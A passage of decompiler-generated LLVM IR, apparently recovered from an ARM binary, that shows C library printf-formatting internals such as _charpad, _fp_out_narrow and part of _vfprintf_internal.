  %v2_14718 = inttoptr i32 %v1_14718 to i32*
  %v3_14718 = load i32, i32* %v2_14718, align 4
  store i32 %v3_14718, i32* @r8, align 4
  %v1_1471c = add i32 %v0_14718, 56
  store i32 %v1_1471c, i32* @r5, align 4
  %v2_14720 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14724 = icmp eq i32 %v3_14718, 0
  store i32 %v0_14718, i32* @r4, align 4
  %v0_1472c = load i32, i32* @r1, align 4
  store i32 %v0_1472c, i32* @r7, align 4
  %v0_14730 = load i32, i32* @r2, align 4
  store i32 %v0_14730, i32* @r6, align 4
  store i32 %v2_14720, i32* @r0, align 4
  br i1 %v2_14724, label %dec_label_pc_14744, label %dec_label_pc_14760

dec_label_pc_14744:                               ; preds = %entry
  %v1_1474c = call i32 @__pthread_return_void()
  store i32 83808, i32* @lr, align 4
  %v1_1475c = call i32 @__pthread_return_0()
  %v0_14760.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14760

dec_label_pc_14760:                               ; preds = %entry, %dec_label_pc_14744
  %v0_14770 = phi i32 [ %v0_14718, %entry ], [ %v0_14760.pre, %dec_label_pc_14744 ]
  %v1_14760 = inttoptr i32 %v0_14770 to i8*
  %v2_14760 = load i8, i8* %v1_14760, align 1
  %v2_14768 = icmp ugt i8 %v2_14760, -65
  br i1 %v2_14768, label %dec_label_pc_14788, label %dec_label_pc_14778

dec_label_pc_14778:                               ; preds = %dec_label_pc_14760
  %v3_14778 = call i32 @__stdio_trans2w_o(i8* %v1_14760, i32 128)
  %v2_1477c = icmp eq i32 %v3_14778, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_1477c, label %dec_label_pc_14778.dec_label_pc_14788_crit_edge, label %dec_label_pc_1479c

dec_label_pc_14778.dec_label_pc_14788_crit_edge:  ; preds = %dec_label_pc_14778
  %v0_14790.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14788

dec_label_pc_14788:                               ; preds = %dec_label_pc_14778.dec_label_pc_14788_crit_edge, %dec_label_pc_14760
  %v0_14790 = phi i32 [ %v0_14790.pre, %dec_label_pc_14778.dec_label_pc_14788_crit_edge ], [ %v0_14770, %dec_label_pc_14760 ]
  %v0_14788 = load i32, i32* @r7, align 4
  %v0_1478c = load i32, i32* @r6, align 4
  %v3_14794 = inttoptr i32 %v0_14788 to i8*
  %v4_14794 = call i32 @_vfprintf_internal(i32 %v0_14790, i8* %v3_14794, i32 %v0_1478c)
  store i32 %v4_14794, i32* @r5, align 4
  br label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %dec_label_pc_14778, %dec_label_pc_14788
  %v0_147b45 = phi i32 [ -1, %dec_label_pc_14778 ], [ %v4_14794, %dec_label_pc_14788 ]
  %v0_1479c = load i32, i32* @r8, align 4
  %v2_1479c = icmp eq i32 %v0_1479c, 0
  br i1 %v2_1479c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1479c
  call void @__pseudo_branch(i32 95952)
  %v0_147b4.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1479c, %bb
  %v0_147b4 = phi i32 [ %v0_147b45, %dec_label_pc_1479c ], [ %v0_147b4.pre, %bb ]
  ret i32 %v0_147b4

; uselistorder directives
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1479c, { 1, 0 }
  uselistorder label %dec_label_pc_14760, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_147d0 = load i32, i32* @r4, align 4
  %v6_147d0 = load i32, i32* @r5, align 4
  %v9_147d0 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_147f02 = icmp eq i32 %arg3, 0
  %v2_147f4 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_147f02, label %dec_label_pc_14810, label %dec_label_pc_14804

dec_label_pc_147ec:                               ; preds = %dec_label_pc_14804
  %v1_147ec = add i32 %v0_147ec, -1
  store i32 %v1_147ec, i32* @r4, align 4
  %v2_147f0 = icmp eq i32 %v1_147ec, 0
  %v0_147fc = load i32, i32* @r6, align 4
  br i1 %v2_147f0, label %dec_label_pc_14810.loopexit, label %dec_label_pc_14804

dec_label_pc_14804:                               ; preds = %entry, %dec_label_pc_147ec
  %v0_147fc4 = phi i32 [ %v0_147fc, %dec_label_pc_147ec ], [ %arg1, %entry ]
  %v3_14804 = call i32 @__stdio_fwrite(i32 %v2_147f4, i32 1, i32 %v0_147fc4)
  %v7_14808 = icmp eq i32 %v3_14804, 1
  %v0_147ec = load i32, i32* @r4, align 4
  br i1 %v7_14808, label %dec_label_pc_147ec, label %dec_label_pc_14810.loopexit

dec_label_pc_14810.loopexit:                      ; preds = %dec_label_pc_147ec, %dec_label_pc_14804
  %v0_14810.ph = phi i32 [ %v0_147ec, %dec_label_pc_14804 ], [ 0, %dec_label_pc_147ec ]
  %v1_14810.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14810

dec_label_pc_14810:                               ; preds = %dec_label_pc_14810.loopexit, %entry
  %v1_14810 = phi i32 [ 0, %entry ], [ %v1_14810.pre, %dec_label_pc_14810.loopexit ]
  %v0_14810 = phi i32 [ 0, %entry ], [ %v0_14810.ph, %dec_label_pc_14810.loopexit ]
  %v2_14810 = sub i32 %v1_14810, %v0_14810
  store i32 %v3_147d0, i32* @r4, align 4
  store i32 %v6_147d0, i32* @r5, align 4
  store i32 %v9_147d0, i32* @r6, align 4
  ret i32 %v2_14810

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14810.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14804, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1481c = load i32, i32* @r4, align 4
  store i32 %v3_1481c, i32* %stack_var_-24, align 4
  %v9_1481c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_14824 = and i32 %arg2, 128
  %v2_14824 = icmp eq i32 %v1_14824, 0
  %v0_14828 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14828, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_14824, label %bb, label %dec_label_pc_1483c

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1487c

dec_label_pc_1483c:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14840 = call i32 @strlen(i8* %arg4)
  store i32 %v3_14840, i32* %r0.global-to-local, align 4
  %v1_14844 = load i32, i32* %r4.global-to-local, align 4
  %v2_14844 = sub i32 %v1_14844, %v3_14840
  store i32 %v2_14844, i32* @r4, align 4
  store i32 %v3_14840, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_14844, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_1485c

.thread:                                          ; preds = %dec_label_pc_1483c
  store i32 %v3_14840, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1487c

dec_label_pc_1485c:                               ; preds = %dec_label_pc_1483c
  %v0_1485c = load i32, i32* @r6, align 4
  %v1_1485c = urem i32 %v0_1485c, 128
  %v0_14860 = load i32, i32* @r8, align 4
  store i32 %v0_14860, i32* %r0.global-to-local, align 4
  %v3_14868 = trunc i32 %v1_1485c to i8
  %v4_14868 = call i32 @_charpad(i32 %v0_14860, i8 %v3_14868, i32 %v2_14844)
  store i32 %v4_14868, i32* %r0.global-to-local, align 4
  %v1_1486c = load i32, i32* @r4, align 4
  %v9_1486c = icmp eq i32 %v4_14868, %v1_1486c
  store i32 %v4_14868, i32* %r6.global-to-local, align 4
  br i1 %v9_1486c, label %dec_label_pc_14878, label %dec_label_pc_14898

dec_label_pc_14878:                               ; preds = %dec_label_pc_1485c
  %v0_14878 = load i32, i32* @r5, align 4
  store i32 %v0_14878, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1487c

dec_label_pc_1487c:                               ; preds = %bb, %.thread, %dec_label_pc_14878
  %v5_14888 = phi i32 [ %v0_14878, %dec_label_pc_14878 ], [ %arg3, %bb ], [ %v3_14840, %.thread ]
  %tmp17 = icmp slt i32 %v5_14888, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_1487c
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_1487c
  %v5_14884 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_14884, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_17e6c.901 to i32))
  %v0_14894 = load i32, i32* %r6.global-to-local, align 4
  %v2_14894 = add i32 %storemerge, %v0_14894
  store i32 %v2_14894, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14898

dec_label_pc_14898:                               ; preds = %dec_label_pc_1485c, %bb19
  %v0_14898 = phi i32 [ %v4_14868, %dec_label_pc_1485c ], [ %v2_14894, %bb19 ]
  store i32 %v0_14898, i32* %r0.global-to-local, align 4
  %v2_1489c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1489c, i32* %r4.global-to-local, align 4
  store i32 %v9_1481c, i32* %r6.global-to-local, align 4
  ret i32 %v0_14898

; uselistorder directives
  uselistorder i32 %v0_14898, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14898, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_1487c, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_148a0 = load i32, i32* @r4, align 4
  store i32 %v3_148a0, i32* %stack_var_-36, align 4
  %v6_148a0 = load i32, i32* @r5, align 4
  %v15_148a0 = load i32, i32* @r8, align 4
  %v18_148a0 = load i32, i32* @sb, align 4
  %v21_148a0 = load i32, i32* @sl, align 4
  %v24_148a0 = load i32, i32* @fp, align 4
  %v2_148a8 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_148a8, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_148a8, i32* %r0.global-to-local, align 4
  %v0_148b4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_148b4, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_148bc = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_148bc, i32* %r0.global-to-local, align 4
  %v1_148c0 = icmp slt i32 %v2_148bc, 0
  br i1 %v1_148c0, label %dec_label_pc_148c8, label %dec_label_pc_148fc

dec_label_pc_148c8:                               ; preds = %entry
  %v3_148c8 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_148c8, i32* @r4, align 4
  %v1_148cc = inttoptr i32 %v3_148c8 to i8*
  store i32 %v3_148c8, i32* %r0.global-to-local, align 4
  %v3_148d0 = call i32 @strlen(i8* %v1_148cc)
  store i32 %v3_148d0, i32* %r0.global-to-local, align 4
  %v2_148d4 = icmp eq i32 %v3_148d0, 0
  br i1 %v2_148d4, label %bb, label %dec_label_pc_148e4

bb:                                               ; preds = %dec_label_pc_148c8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e74

dec_label_pc_148e4:                               ; preds = %dec_label_pc_148c8
  %v0_148e4 = load i32, i32* @r4, align 4
  store i32 %v0_148e4, i32* %r0.global-to-local, align 4
  %v0_148e8 = load i32, i32* @fp, align 4
  store i32 %v0_148e8, i32* %r2.global-to-local, align 4
  %v3_148ec = call i32 @__stdio_fwrite(i32 %v0_148e4, i32 %v3_148d0, i32 %v0_148e8)
  store i32 %v3_148ec, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14e74

dec_label_pc_148fc:                               ; preds = %entry
  store i32 %v2_148a8, i32* %r0.global-to-local, align 4
  %v0_14900 = load i32, i32* @r5, align 4
  %v2_14904 = call i32 @_ppfs_prepargs(i32 %v2_148a8, i32 %v0_14900)
  store i32 %v2_14904, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_149a4 = zext i8 %tmp104 to i32
  %v2_149ac = ptrtoint i32* %stack_var_-252 to i32
  %v2_149cc = ptrtoint i32* %stack_var_-36 to i32
  %v2_149e4 = icmp eq i32 %tmp102, 0
  %v1_149f8 = inttoptr i32 %tmp101 to i32*
  %v2_14ce8 = ptrtoint i32* %stack_var_-180 to i32
  %v2_14c04 = ptrtoint i32* %stack_var_-44 to i32
  %v2_14c18 = ptrtoint i32* %stack_var_-52 to i32
  %v3_14bb4 = add i32 %tmp101, 4
  %v4_14bb4 = inttoptr i32 %v3_14bb4 to i32*
  %v2_14bb8 = ptrtoint i32* %stack_var_-328 to i32
  %v7_14a78 = zext i8 %tmp99 to i32
  %v2_14ab4 = ptrtoint i32* %stack_var_-53 to i32
  %v5_14abc = bitcast i32* %stack_var_-53 to i8*
  %v2_14ac4 = icmp ugt i32 %tmp102, 4
  %v7_14ac4 = icmp eq i32 %tmp102, 5
  %v0_14e5c.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_149dc187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_14bd8 = icmp ugt i32 %tmp102, 16
  %v7_14bd8 = icmp eq i32 %tmp102, 17
  %v2_14bdc = xor i1 %v7_14bd8, true
  %v3_14bdc = and i1 %v2_14bd8, %v2_14bdc
  %v2_14c78 = icmp ugt i32 %tmp102, 18
  %v7_14c78 = icmp eq i32 %tmp102, 19
  %v2_14c7c = xor i1 %v7_14c78, true
  %v3_14c7c = and i1 %v2_14c78, %v2_14c7c
  %v7_14cdc = icmp eq i32 %tmp102, 20
  %v2_14a1c = add i32 %tmp102, ptrtoint (i32* @global_var_1f644.903 to i32)
  %v1_14a20 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1f644.903 to i32), i32 -1)
  %v2_14a20 = inttoptr i32 %v1_14a20 to i8*
  %v2_14a4c = xor i1 %v7_14ac4, true
  %v3_14a4c = and i1 %v2_14ac4, %v2_14a4c
  %v7_14a80 = icmp eq i32 %tmp102, 1
  %v2_14acc = xor i1 %v2_14ac4, true
  %v3_14acc = or i1 %v7_14ac4, %v2_14acc
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_14b34 = icmp eq i32 %tmp102, 3
  %v11_14b40 = icmp eq i32 %tmp102, 4
  %v9_149b0 = mul nuw nsw i32 %v4_149a4, 8
  %v10_149b0 = add nsw i32 %v9_149b0, -8
  %v6_149b8 = add i32 %v10_149b0, %v2_149ac
  br label %dec_label_pc_14e5c

bb126:                                            ; preds = %dec_label_pc_14914.outer, %.thread7
  %v2_14914185 = phi i8 [ %v2_14914, %.thread7 ], [ %v2_14914181, %dec_label_pc_14914.outer ]
  %v1_14928184 = phi i32 [ %v2_14928, %.thread7 ], [ %v0_1491449, %dec_label_pc_14914.outer ]
  %v8_1491c = icmp eq i8 %v2_14914185, 37
  br i1 %v8_1491c, label %dec_label_pc_14930, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_14928 = add i32 %v1_14928184, 1
  store i32 %v2_14928, i32* @r4, align 4
  %v1_14914 = inttoptr i32 %v2_14928 to i8*
  %v2_14914 = load i8, i8* %v1_14914, align 1
  %v3_14914 = zext i8 %v2_14914 to i32
  store i32 %v3_14914, i32* %r3.global-to-local, align 4
  %v2_14918 = icmp eq i8 %v2_14914, 0
  br i1 %v2_14918, label %dec_label_pc_14930, label %bb126

dec_label_pc_14930:                               ; preds = %bb126, %.thread7, %dec_label_pc_14914.outer
  %v1_14928.lcssa = phi i32 [ %v0_1491449, %dec_label_pc_14914.outer ], [ %v2_14928, %.thread7 ], [ %v1_14928184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_14930 = sub i32 %v1_14928.lcssa, %v5_14940
  %v9_14930 = icmp eq i32 %v1_14928.lcssa, %v5_14940
  br i1 %v9_14930, label %dec_label_pc_14964, label %dec_label_pc_14938

dec_label_pc_14938:                               ; preds = %dec_label_pc_14930
  store i32 %v2_14930, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_14930, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_14938
  store i32 %v5_14940, i32* %r0.global-to-local, align 4
  %v5_14948 = load i32, i32* @fp, align 4
  store i32 %v5_14948, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_14938, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_14938 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_17e6c.901 to i32))
  %v0_14950 = load i32, i32* %r0.global-to-local, align 4
  %v1_14950 = load i32, i32* @r5, align 4
  %v9_14950 = icmp eq i32 %v0_14950, %v1_14950
  br i1 %v9_14950, label %dec_label_pc_14958, label %dec_label_pc_14e6c

dec_label_pc_14958:                               ; preds = %bb130
  %v2_1495c = add i32 %v0_14950, %stack_var_-336.1.ph
  %v0_14964.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14964

dec_label_pc_14964:                               ; preds = %dec_label_pc_14930, %dec_label_pc_14958
  %v0_14978 = phi i32 [ %v5_14940, %dec_label_pc_14930 ], [ %v0_14964.pre, %dec_label_pc_14958 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_14930 ], [ %v2_1495c, %dec_label_pc_14958 ]
  %v1_14964 = inttoptr i32 %v0_14978 to i8*
  %v2_14964 = load i8, i8* %v1_14964, align 1
  %v3_14964 = zext i8 %v2_14964 to i32
  store i32 %v3_14964, i32* %r3.global-to-local, align 4
  %v2_14968 = icmp eq i8 %v2_14964, 0
  br i1 %v2_14968, label %dec_label_pc_14e74, label %dec_label_pc_14970

dec_label_pc_14970:                               ; preds = %dec_label_pc_14964
  %v1_14970 = add i32 %v0_14978, 1
  %v2_14970 = inttoptr i32 %v1_14970 to i8*
  %v3_14970 = load i8, i8* %v2_14970, align 1
  %v4_14970 = zext i8 %v3_14970 to i32
  store i32 %v4_14970, i32* %r3.global-to-local, align 4
  %v7_14974 = icmp eq i8 %v3_14970, 37
  store i32 %v1_14970, i32* %r2.global-to-local, align 4
  br i1 %v7_14974, label %dec_label_pc_14e64, label %dec_label_pc_14980

dec_label_pc_14980:                               ; preds = %dec_label_pc_14970
  store i32 %v2_148a8, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_148a8, i32* %r0.global-to-local, align 4
  store i32 %v1_14970, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_14994 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_148a8, i32* @r0, align 4
  %v0_1499c = call i32 @_ppfs_setargs()
  store i32 %v0_1499c, i32* %r0.global-to-local, align 4
  store i32 %v4_149a4, i32* %ip.global-to-local, align 4
  store i32 %v2_149ac, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_14980
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_14980
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_149b8, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_149c478 = phi i32 [ %v6_149b8, %bb133 ], [ %v2_149ac, %.thread ]
  store i32 %v2_149cc, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_149dc187, label %dec_label_pc_149c4, label %dec_label_pc_149e0

dec_label_pc_149c4:                               ; preds = %bb134, %dec_label_pc_149c4
  %v5_149d4189 = phi i32 [ %v5_149d4, %dec_label_pc_149c4 ], [ %v2_149cc, %bb134 ]
  %v0_149c4188 = phi i32 [ %v1_149c8, %dec_label_pc_149c4 ], [ %v0_149c478, %bb134 ]
  %v2_149c4 = add i32 %v5_149d4189, -4
  %v3_149c4 = inttoptr i32 %v2_149c4 to i32*
  store i32 %v0_149c4188, i32* %v3_149c4, align 4
  %v0_149c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_149c8 = add i32 %v0_149c8, 8
  store i32 %v1_149c8, i32* %r3.global-to-local, align 4
  %v0_149d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_149d0.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_149cc, i32* @lr, align 4
  %v4_149d4 = mul i32 %v0_149d0.pre, 4
  %v5_149d4 = add i32 %v4_149d4, %v2_149cc
  %v1_149d8 = add i32 %v0_149d0.pre, 1
  store i32 %v1_149d8, i32* %r2.global-to-local, align 4
  %v5_149dc = icmp slt i32 %v0_149d0.pre, %v1_149d0.pre
  br i1 %v5_149dc, label %dec_label_pc_149c4, label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149c4, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_149e4, label %dec_label_pc_149ec, label %dec_label_pc_14a10

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149e0
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_149f8 = load i32, i32* %v1_149f8, align 4
  store i32 %v2_149f8, i32* %r0.global-to-local, align 4
  %v1_149fc = and i32 %v0_14a40, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_14a04 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_14a04, i32* %r3.global-to-local, align 4
  %v4_14a08 = inttoptr i32 %v2_149f8 to i8*
  %v5_14a08 = call i32 @_store_inttype(i8* %v4_14a08, i32 %v1_149fc, i32 %stack_var_-336.2, i32 %v3_14a04)
  store i32 %v5_14a08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14e58

dec_label_pc_14a10:                               ; preds = %dec_label_pc_149e0
  br i1 %tmp195, label %dec_label_pc_14b9c, label %dec_label_pc_14a18

dec_label_pc_14a18:                               ; preds = %dec_label_pc_14a10
  store i32 %v2_14a1c, i32* %r3.global-to-local, align 4
  %v3_14a20 = load i8, i8* %v2_14a20, align 1
  %v4_14a20 = zext i8 %v3_14a20 to i32
  store i32 %v4_14a20, i32* @r4, align 4
  %v7_14a24 = icmp eq i8 %v3_14a20, 10
  br i1 %v7_14a24, label %dec_label_pc_14a30, label %bb135

bb135:                                            ; preds = %dec_label_pc_14a18
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_14a30:                               ; preds = %dec_label_pc_14a18
  store i32 %v0_14a40, i32* %r3.global-to-local, align 4
  %v1_14a34 = and i32 %v0_14a40, 32
  %v2_14a34 = icmp eq i32 %v1_14a34, 0
  %.175 = select i1 %v2_14a34, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_14a40 = and i32 %v0_14a40, 64
  %v2_14a40 = icmp eq i32 %v1_14a40, 0
  br i1 %v2_14a40, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_14a30
  %.176 = select i1 %v2_14a34, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_14a30, %bb138
  br i1 %v3_14a4c, label %.thread84, label %dec_label_pc_14a54

.thread84:                                        ; preds = %bb139
  %v5_14a4c = sub nsw i32 0, %v4_14a20
  store i32 %v5_14a4c, i32* @r4, align 4
  br label %dec_label_pc_14a6c

dec_label_pc_14a54:                               ; preds = %bb139
  br i1 %v7_14b34, label %bb140, label %dec_label_pc_14a60

bb140:                                            ; preds = %dec_label_pc_14a54
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_14a6c

dec_label_pc_14a60:                               ; preds = %dec_label_pc_14a54
  br i1 %v7_14a80, label %dec_label_pc_14a70, label %dec_label_pc_14a6c

dec_label_pc_14a6c:                               ; preds = %.thread84, %bb140, %dec_label_pc_14a60
  %v0_14a9886 = phi i32 [ %v5_14a4c, %.thread84 ], [ %v4_14a20, %bb140 ], [ %v4_14a20, %dec_label_pc_14a60 ]
  br label %dec_label_pc_14a70

dec_label_pc_14a70:                               ; preds = %dec_label_pc_14a60, %dec_label_pc_14a6c
  %v0_14a9885 = phi i32 [ %v0_14a9886, %dec_label_pc_14a6c ], [ %v4_14a20, %dec_label_pc_14a60 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_14a6c ], [ 6, %dec_label_pc_14a60 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_14a70 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14a70, i32* %r3.global-to-local, align 4
  %v1_14a74 = icmp slt i32 %v3_14a70, 0
  %v7_14a78. = select i1 %v1_14a74, i32 %v7_14a78, i32 32
  store i32 %v7_14a78., i32* @sb, align 4
  br i1 %v7_14a80, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_14a70
  store i32 %v2_149cc, i32* @lr, align 4
  %v2_14a88 = load i32, i32* %ip.global-to-local, align 4
  %v5_14a88 = mul i32 %v2_14a88, 4
  %v6_14a88 = add i32 %v5_14a88, %v2_149cc
  store i32 %v6_14a88, i32* %r3.global-to-local, align 4
  %v2_14a8c = add i32 %v6_14a88, -260
  %v3_14a8c = inttoptr i32 %v2_14a8c to i32*
  %v4_14a8c = load i32, i32* %v3_14a8c, align 4
  store i32 %v4_14a8c, i32* %r3.global-to-local, align 4
  %v2_14a94 = and i32 %v4_14a8c, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_14a70, %.thread16
  %storemerge94 = phi i32 [ %v2_14a94, %.thread16 ], [ 1024, %dec_label_pc_14a70 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_14a9885, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_14aa0 = call i32 @_load_inttype()
  %v0_14aa4 = load i32, i32* @r1, align 4
  store i32 %v0_14aa4, i32* %r2.global-to-local, align 4
  %v0_14ab0 = load i32, i32* @r4, align 4
  store i32 %v0_14ab0, i32* %r3.global-to-local, align 4
  store i32 %v2_14ab4, i32* %r0.global-to-local, align 4
  %v0_14ab8 = load i32, i32* @r5, align 4
  %v6_14abc = call i32 @_uintmaxtostr(i8* %v5_14abc, i32 %v0_14aa0, i32 %v0_14aa4, i32 %v0_14ab0, i32 %v0_14ab8)
  store i32 %v6_14abc, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_14abc, i32* @r6, align 4
  br i1 %v3_14acc, label %bb148, label %dec_label_pc_14ad0

dec_label_pc_14ad0:                               ; preds = %bb145
  %v7_14abc = inttoptr i32 %v6_14abc to i8*
  %v3_14ad0 = load i8, i8* %v7_14abc, align 1
  %v7_14ad4 = icmp eq i8 %v3_14ad0, 45
  %v2_14adc = or i32 %v0_14a40, 2
  %v2_14adc.stack_var_-316.4 = select i1 %v7_14ad4, i32 %v2_14adc, i32 %v0_14a40
  store i32 %v2_14adc.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_14ad4, label %.thread18, label %dec_label_pc_14af0

.thread18:                                        ; preds = %dec_label_pc_14ad0
